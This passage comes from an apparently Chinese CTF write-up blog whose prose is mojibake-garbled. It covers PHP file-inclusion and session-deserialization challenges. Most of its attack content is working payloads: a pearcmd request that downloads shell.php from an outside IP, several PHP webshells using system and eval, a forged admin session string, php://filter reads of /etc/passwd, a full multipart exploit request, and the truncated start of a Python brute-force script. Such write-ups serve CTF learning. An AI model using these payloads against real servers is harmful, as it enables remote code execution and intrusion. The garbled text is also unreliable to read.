&lt;p>ä¸è¿‡flagæ–‡ä»¶çš„åå­—å¹¶ä¸æ˜¯flagï¼Œæˆ‘ä»¬å¯ä»¥ç”¨pearcmdå†™shellçš„æ–¹æ³•æ¥ä¸ªwebshellï¼ˆè¯¦ç»†çš„å¯ä»¥å‚è€ƒæˆ‘ä¹‹å‰å†™è¿‡çš„å¦ä¸€ä¸ªé¢˜-&amp;gt;&lt;a href="https://amiaaaz.github.io/2021/10/26/qwnt2021-wp/#give_me_you_0day">[å¼ºç½‘æ‹Ÿæ€ 2021]Give_me_your_0day&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code>/?name=cfile&amp;amp;value=/../../../../usr/local/lib/php/pearcmd.php&amp;amp;+install+-R+/tmp+http://101.35.114.107:2301/shell.php
&lt;/code>&lt;/pre>&lt;p>ä¸è¿‡è¿™é‡Œè¦æ³¨æ„shellçš„å†™æ³•ï¼Œå¸¸è§„çš„&lt;code>&amp;lt;?php eval($_POST['a']);?&amp;gt;&lt;/code>è¿™æ ·çš„æ˜¯ä¸è¡Œçš„ï¼Œä¸‹è½½å°±ä¼šæŠ¥é”™&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118103659930.png" alt="image-20211118103659930">&lt;/p>
&lt;p>æ‰§è¡Œä¹Ÿä¼šæŠ¥é”™ï¼Œè¿™é‡Œçš„shellè¦è¿™æ ·å†™&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;?php system(&amp;#34;ls /&amp;#34;);&amp;#39;&lt;/span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118105922638.png" alt="image-20211118105922638">&lt;/p>
&lt;p>ä¹‹åç›´æ¥æŠŠvalueçš„å€¼æ¢æˆflagæ–‡ä»¶åå³å¯&lt;/p>
&lt;pre tabindex="0">&lt;code>/?name=cfile&amp;amp;value=/flag32897328937298hdwidh
&lt;/code>&lt;/pre>&lt;p>â€”â€”â€”â€”ä¸è¿‡è¿™é‡Œæˆ‘ç›´æ¥å†™ğŸä¸€ç›´æˆåŠŸä¸äº†ï¼Œåªèƒ½è¿œç¨‹åŒ…å«ğŸ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118110226581.png" alt="image-20211118110226581">&lt;/p>
&lt;p>â€”â€”â€”â€”è¯¶ï¼Œè¯´äº†åŠå¤©ï¼Œå…¶å®å’Œæœ¬ç¯‡æœ‰å…³çš„åœ¨éé¢„æœŸçš„ç‚¹ï¼Œå’Œä¸Šé¢çš„è„šæœ¬å‡ ä¹ä¸€æ ·ï¼Œè¦æ”¹çš„åœ°æ–¹åœ¨äºreadéƒ¨åˆ†çš„urläº†&lt;/p>
&lt;pre tabindex="0">&lt;code>?name=cfile&amp;amp;value=/tmp/sess_&amp;#39;+sessid
&lt;/code>&lt;/pre>&lt;h2 id="ååºåˆ—åŒ–">ååºåˆ—åŒ–&lt;/h2>
&lt;p>è¿™é‡Œè¯¦ç»†çš„è®²è§£å¯ä»¥å‚ç…§&lt;a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/">PHPä¸­SESSIONååºåˆ—åŒ–æœºåˆ¶&lt;/a>ï¼Œå°±ä¸åšå¤åˆ¶ç²˜è´´å·¥ç¨‹å¸ˆäº†ï¼Œç”¨è‡ªå·±çš„è¯è®²å‡ ä¸ªé‡Œé¢å·²ç»æè¿‡çš„ç‚¹å§&lt;/p>
&lt;p>é¦–å…ˆï¼Œè¿™é‡Œçš„é—®é¢˜ï¼ˆæˆ‘ä»¬å¯ä»¥æ”»å‡»çš„åŸå› ï¼‰å‡ºç°åœ¨ä¸¤ç§åºåˆ—åŒ–å¼•æ“æ··ç”¨çš„æƒ…å†µä¸‹ï¼Œå½“æäº¤&lt;/p>
&lt;pre tabindex="0">&lt;code>?a=|O:8:&amp;#34;stdClass&amp;#34;:0:{}
&lt;/code>&lt;/pre>&lt;p>æ—¶ï¼Œ&lt;code>php_serialize&lt;/code>æ–¹å¼ä¸‹ä¼šè¢«å­˜å‚¨ä¸º&lt;/p>
&lt;pre tabindex="0">&lt;code>a:1:{s:1:&amp;#34;a&amp;#34;;s:20:&amp;#34;|O:8:&amp;#34;stdClass&amp;#34;:0:{}&amp;#34;;}
&lt;/code>&lt;/pre>&lt;p>ä½†æ˜¯è¢«&lt;code>php&lt;/code>æ–¹å¼åˆ™ä¼šè§£æä¸º&lt;/p>
&lt;pre tabindex="0">&lt;code>a:1:{s:1:&amp;#34;a&amp;#34;;s:20:&amp;#34;=O:8:&amp;#34;stdClass&amp;#34;:0:{}&amp;#34;;}
&lt;/code>&lt;/pre>&lt;p>åœ¨å…·ä½“åº”ç”¨æ—¶ï¼Œå¯æ§çš„ç‚¹é™¤äº†get/postçš„å‚æ•°ä¹‹å¤–ï¼Œè¿˜å¯ä»¥æ¥ç€æ„é€ æ–‡ä»¶ä¸Šä¼ çš„è¡¨å•ï¼Œé™¤äº†&lt;code>PHPSESSID&lt;/code>ä¹‹å¤–çš„åºŸç‰©æ–‡ä»¶çš„æ–‡ä»¶åå°±å¯ä»¥å½“æ­¤å¤§ä»»ï¼Œè®°å¾—åºåˆ—åŒ–å­—ç¬¦å‰é¢è¦åŠ ä¸Š&lt;code>|&lt;/code>ï¼Œå†…éƒ¨çš„åŒå¼•å·è¦ç”¨&lt;code>\&lt;/code>è¿›è¡Œè½¬ä¹‰&lt;/p>
&lt;h3 id="harekazectf2019easy-notes">[HarekazeCTF2019]Easy Notes&lt;/h3>
&lt;p>è¿™ä¸ªé¢˜å¾—å®¡&lt;a href="https://github.dev/TeamHarekaze/HarekazeCTF2019-challenges/tree/master/easy_notes/server/public">æºç &lt;/a>&lt;/p>
&lt;p>æœ‰æ·»åŠ note å¯¼å‡ºnoteçš„åŠŸèƒ½ï¼Œä½†æ˜¯å´ä¸æ˜¯å¸¸è§çš„xssï¼ˆå› ä¸ºæ˜¯phpå†™çš„å˜›ï¼‰ï¼Œä¼šæ£€æµ‹sessionä¸­çš„adminæ˜¯ä¸æ˜¯true&lt;/p>
&lt;p>æˆ‘ä»¬çš„çªç ´å£åœ¨å¯¼å‡º.zipè¿™ä¸ªåŠŸèƒ½ä¸Š&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203112810148.png" alt="image-20211203112810148">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203113735250.png" alt="image-20211203113735250">&lt;/p>
&lt;p>æˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨ä¼ªé€ ä¸€ä¸ªsessionæ–‡ä»¶ï¼Œä¹‹åå°†PHPSESSIDè®¾ä¸ºç”Ÿæˆçš„å€¼å³å¯ï¼Œå†…å®¹å‘¢ å°±æ˜¯admin=1&lt;/p>
&lt;pre tabindex="0">&lt;code>xxxx|N;admin|b:1;xxxxxx
&lt;/code>&lt;/pre>&lt;p>ç”¨&lt;code>xxxx|N;&lt;/code>é—­åˆå‰é¢è„æ•°æ®ï¼Œç¼–è¾‘åˆ°titleä¸­ï¼Œå°†sessionçš„PHPSESSIDè®¾ç½®å¥½å°±å¯ä»¥getflagäº†&lt;/p>
&lt;h3 id="xctf-final-2018bestphp">[XCTF final 2018]bestphp&lt;/h3>
&lt;p>&lt;a href="https://github.com/shimmeris/CTF-Web-Challenges/tree/master/File-Inclusion/XCTF-Final-2018-Bestphp">è¿™é‡Œæ˜¯dockerç¯å¢ƒ&lt;/a>ï¼ˆæ³¨æ„è®¾ç½®æš´éœ²ç«¯å£ å¦å¤–é¦–é¡µçš„index.phpçš„submitè¦æ”¹ä¸€ä¸‹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129171252486.png" alt="image-20211129171252486">&lt;/p>
&lt;p>è¿™é‡Œæœ‰ç†Ÿæ‚‰çš„&lt;code>call_user_func&lt;/code>ï¼Œæ¥è¯»ä¸€ä¸‹admin.phpçš„æºç &lt;/p>
&lt;pre tabindex="0">&lt;code>?function=extract&amp;amp;file=php://filter/convert.base64-encode/resource=admin.php
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">hello&lt;/span> &lt;span style="color:#75af00">admin&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">empty&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SESSION&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;name&amp;#39;&lt;/span>&lt;span style="color:#111">])){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">session_start&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#echo &amp;#39;hello &amp;#39; + $_SESSION[&amp;#39;name&amp;#39;];
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;you must login with admin&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å†è¯»ä¸€ä¸‹function.phpï¼Œä½†æ˜¯å¥½åƒè¿™ä¿©éƒ½æ²¡å•¥ç”¨&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">filters&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">foreach&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$data&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#f92672">=&amp;gt;&lt;/span>&lt;span style="color:#111">$value&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/eval|assert|exec|passthru|glob|system|popen/i&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$value&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Do not hack me!&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¾ˆæ˜¾ç„¶æˆ‘ä»¬éœ€è¦åˆ©ç”¨sessionåŒ…å«ï¼Œä½†æ˜¯index.phpä¸­è®¾ç½®äº†open_basedirï¼Œé»˜è®¤çš„sessionè·¯å¾„æ˜¯&lt;code>/var/lib/php/sessions/sess_phpsessid&lt;/code>ï¼Œä¸è¿‡æœ‰ä¸ªæ–¹å¼å¯ä»¥æ›´æ”¹sessionå­˜å‚¨ç›®å½•&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129172602323.png" alt="image-20211129172602323">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129172609578.png" alt="image-20211129172609578">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129172619585.png" alt="image-20211129172619585">&lt;/p>
&lt;p>é‚£æˆ‘ä»¬å°±å¯ä»¥æŠŠshellå†™åˆ°webæ ¹ç›®å½•ä¸‹&lt;/p>
&lt;pre tabindex="0">&lt;code>?function=session_start&amp;amp;save_path=.
POST: name=&amp;lt;?php echo &amp;#34;aaa&amp;#34;;system($_GET[x]);?&amp;gt;
&lt;/code>&lt;/pre>&lt;p>ä¸€èˆ¬çš„ä¸€å¥è¯ä¼šæ²¡æ³•æ­£å¸¸å·¥ä½œï¼ˆä¹‹å‰æ¹–æ¹˜æ¯willphpä¹Ÿæ˜¯è¿™æ ·ï¼Œé‚£ä¸ªæ˜¯&lt;code>&amp;lt;?php echo '&amp;lt;?php system(&amp;quot;ls /&amp;quot;);'?&amp;gt;&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>?function=extract&amp;amp;file=/var/www/html/sess_qwer&amp;amp;x=ls
?function=extract&amp;amp;file=/var/www/html/sess_qwer&amp;amp;x=cat+fsadgsdagsadgasd.php
&lt;/code>&lt;/pre>&lt;p>æ‹¿åˆ°flag&lt;/p>
&lt;h4 id="è§£æ³•2php70---lfi-via-segmentfault">è§£æ³•2ï¼šphp7.0 - LFI via SegmentFault&lt;/h4>
&lt;p>å‚è€ƒï¼š&lt;a href="https://www.jianshu.com/p/dfd049924258">LFI via SegmentFault&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code>include.php?file=php://filter/string.strip_tags/resource=/etc/passwd
&lt;/code>&lt;/pre>&lt;p>&lt;code>string.strip_tags&lt;/code>å¯ä»¥å¯¼è‡´phpåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­Segment Fault&lt;/p>
&lt;p>å¦‚æœè¯·æ±‚ä¸­åŒæ—¶å­˜åœ¨ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„è¯·æ±‚ï¼Œè¿™ä¸ªæ–‡ä»¶ä¼šè¢«ä¿ç•™ï¼Œå­˜å‚¨åœ¨/tmp/phpxxxxxxxxxxxï¼ˆxxxxxæ˜¯æ•°å­—+å­—æ¯çš„6ä½æ•°ï¼‰ï¼Œè¿™ä¸ªæ–‡ä»¶è¿ç»­ä¿å­˜ï¼Œä¸ç”¨ç«äº‰ç›´æ¥çˆ†ç ´ï¼ˆå¤šçº¿ç¨‹ä¸Šä¼ æ–‡ä»¶ï¼Œç”Ÿæˆå¤šä¸ªphpxxxxxxxxxxxï¼‰&lt;/p>
&lt;p>åˆ©ç”¨expï¼ˆæ‰“å‡ºæ¥502æ˜¯æ­£å¸¸æƒ…å†µ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">POST&lt;/span> &lt;span style="color:#111">/index.php?function=extract&amp;amp;file=php://filter/string.strip_tags/resource=function.php&lt;/span> &lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">101.35.114.107:20004&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Content-Length&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">1701&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Cache-Control&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">max-age=0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Origin&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">null&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Upgrade-Insecure-Requests&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">DNT&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Content-Type&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">multipart/form-data; boundary=----WebKitFormBoundaryeScXqSzdW2v22xyk&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">User-Agent&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Accept&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Accept-Encoding&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">gzip, deflate&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Accept-Language&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Cookie&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">PHPSESSID=17qpuv1r8g19pm503593nddq10&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Connection&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">close&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>------WebKitFormBoundaryeScXqSzdW2v22xyk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Disposition: form-data; name=&amp;#34;fileUpload&amp;#34;; filename=&amp;#34;test.jpg&amp;#34;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type: image/jpeg
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;?php echo &amp;#34;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww&amp;#34;;@eval($_POST[&amp;#39;cmd&amp;#39;]); ?&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>------WebKitFormBoundaryeScXqSzdW2v22xyk--
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¸Šå¸è§†è§’çœ‹çš„è¯æ˜¯è¿™æ ·&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129183250382.png" alt="image-20211129183250382">&lt;/p>
&lt;p>ç”¨pyè„šæœ¬çˆ†ç ´å‡ºæ¥(py2)&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">string&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">charset&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">digits&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">letters&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">host&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;10.99.99.16&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">80&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">base_url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">:&lt;/span>&lt;span style="color:#d88200">%d&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">host&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">port&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">brute_force_tmp_files&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">charset&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">j&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">charset&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">k&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">charset&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">l&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">charset&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">charset&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">charset&lt;/span>&lt;span style="color:#111">:&lt;/span>
